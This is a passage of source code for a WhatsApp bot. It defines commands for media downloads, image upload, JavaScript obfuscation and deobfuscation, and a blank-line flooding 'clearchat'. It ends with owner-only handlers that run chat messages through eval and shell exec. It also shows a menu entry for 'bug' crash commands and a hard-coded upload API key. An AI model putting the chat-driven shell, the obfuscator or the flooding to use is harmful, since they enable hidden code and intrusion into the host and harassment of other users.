│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url )
│ ✇ *.trackip* ( 173.255.160.70 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
└──────────────▪
┌── [ *\`Bug Menu\`* ]
│ ✇ *.crt* ( group link )
└──────────────▪
┌── [ *\`All video downloader\`* ]
│ ✇ *.vdl* ( link )
└──────────────▪
    `;

    // Send single message with image and buttons, skip reactions
    await conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textAllMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });
}
break;
*/
case 'clearchat':
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

for (let i = 0; i < 2; i++) {
if (!q) return enviar("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
await conn.sendMessage(numi, {
text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
})
}
break;



/**
  * famofc
  * don't forget to follow
  * https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q
*/


//===========TOOLS MENU=========//
case "tt":
case "tiktok": {
    // Check if URL is provided
    if (!text) {
        return enviar(`📌 *Usage:* ${prefix + command} <tiktok_url>\nExample: ${prefix + command} https://www.tiktok.com/@username/video/123456789\n\n🔥 *Powered by FAM OFC*`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url) || !url.includes("tiktok.com")) {
        return enviar("❌ *Invalid URL!* Please provide a valid TikTok video URL (e.g., https://www.tiktok.com/@username/video/123456789).");
    }

    try {
        // Send loading animation
        await loadingx();

        // Fetch media from API
        const apiUrl = `https://rest-lily.vercel.app/api/downloader/tiktok?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl, {
            headers: { Accept: "*/*" }
        });
        const data = response.data;

        if (data.status === true && data.data) {
            const { no_watermark, music, title, creator } = data.data;

            // Validate URLs
            if (!no_watermark || !music) {
                return enviar("❌ *Error:* No downloadable media found in the provided URL.\nEnsure the video is public and try again.");
            }

            // Send No-Watermark Video (simple, no contextInfo)
            await conn.sendMessage(m.chat, {
                video: { url: no_watermark },
                caption: `🎥 TikTok Video\n\n🔥 Powered by FAM OFC`
            }, { quoted: m });

            // Send Audio MP3 (with channel link in contextInfo)
            await conn.sendMessage(m.chat, {
                audio: { url: music },
                mimetype: "audio/mpeg",
                ptt: false,
                caption: `🎵 *TikTok Music MP3*\n\n📝 *Title:* ${title || "No title"}\n👤 *Creator:* ${creator || "Unknown"}\n\n🔥 *Powered by FAM OFC*`,
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "fam vip bot",
                        newsletterJid: "120363390114292114@newsletter"
                    },
                    isForwarded: true,
                    externalAdReply: {
                        title: "fam vip bot v10",
                        thumbnailUrl: "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg",
                        sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
                    }
                }
            }, { quoted: m });
        } else {
            await enviar(`❌ *Failed to fetch TikTok media:* ${data.message || "No media found in the provided URL."}\nPlease check the URL and ensure the video is public.`);
        }
    } catch (error) {
        console.error("TikTok Downloader Error:", error);
        await conn.sendMessage(m.chat, { text: `❌ *Error:* ${error.message || "Unable to download TikTok media. Try again later."}` }, { quoted: m });
    }
}
break;

case 'enc':  {

        const usage = `Usage Example:
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return enviar(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'extendedTextMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難FAM_OFC素晴座素晴難" + 
            "素晴座素晴難FAM_OFC素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "FAM_OFC" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_famofc.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await conn.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By famofc.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await enviar(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
    if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    const { webcrack } = await import('webcrack');
    const usage = `📌 *Usage Example:*\n`
        + `- *${prefix + command}* (Input text or reply to encrypted text)\n`
        + `- *${prefix + command} doc* (Reply to an encrypted document)`;

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return enviar(usage);
    }

    try {
        let message;
        let filePath = './dec_by_FAMOFC.js';

        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
        } else {
            message = await webcrack(text);
        }

        fs.writeFileSync(filePath, message.code);

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'application/javascript',
            fileName: 'Decrypted_By_FAMOFC.js'
        }, { quoted: m });

        // Delete the file after sending
        fs.unlinkSync(filePath);
    } catch (error) {
        enviar(`⚠ *Error Decrypting:* ${error.message}`);
    }
}
break;


case 'splay': {
 const axios = require("axios");
 if (!text) return enviar('song name lekho');

 await enviar("loading");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return enviar("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await conn.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await conn.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 enviar("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 enviar("Terjadi kesalahan saat mengambil file audio.");
 }
}
break
case "tourl": {
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
    if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.startsWith("image/")) {
        return enviar("📌 براہ کرم کسی تصویر پر ریپلائے کریں تاکہ اسے لنک میں تبدیل کیا جا سکے!");
    }

    let media = await m.quoted.download();
    let tempFilePath = "./fam_ofc.jpg"; // Temporary file path

    fs.writeFileSync(tempFilePath, media); // Save the buffer as an image file

    let formData = new FormData();
    formData.append("image", fs.createReadStream(tempFilePath)); // Use createReadStream

    try {
        let response = await axios.post(
            "https://api.imgbb.com/1/upload?key=1fe5c36a643f15d1e5478c716f876a4c",
            formData,
            { headers: { ...formData.getHeaders() } }
        );

        fs.unlinkSync(tempFilePath); // Delete temp file after upload

        let data = response.data;
        if (data.success) {
            let imageUrl = data.data.url;
            enviar(`✅ **Image Uploaded Successfully!**\n🔗 **URL:** ${imageUrl}`);
        } else {
            enviar("⚠ تصویر کو لنک میں تبدیل کرنے میں خرابی ہوئی، دوبارہ کوشش کریں!");
        }
    } catch (error) {
        console.error("API Error:", error);
        enviar("⚠ API سے کنکشن ناکام ہوگیا، دوبارہ کوشش کریں!");
    }
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator(sender)) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == conn) {
bang = util.format(sul)
}
return enviar(bang)
}
try {
enviar(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
enviar(String(e))
}
}


if (budy.startsWith('>')) {
if (!isCreator(sender)) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await enviar(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator(sender)) return
exec(budy.slice(2), (err, stdout) => {
if (err) return enviar(`${err}`)
if (stdout) return enviar(stdout)
})
}

}
} catch (err) {
console.log(util.format(err))
}
}

const getAIResponse = async (userText, m) => {
    try {
        const apiUrl = `https://fam-official.serv00.net/sim/famofcai.php?text=${encodeURIComponent(userText)}`;
        const response = await axios.get(apiUrl);

        console.log("AI API Response:", response.data); // Debugging

        if (response.data && response.data.success) {
            return m.reply(`${response.data.message}`);
        } else {
            return m.reply(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        return m.reply("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
};


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
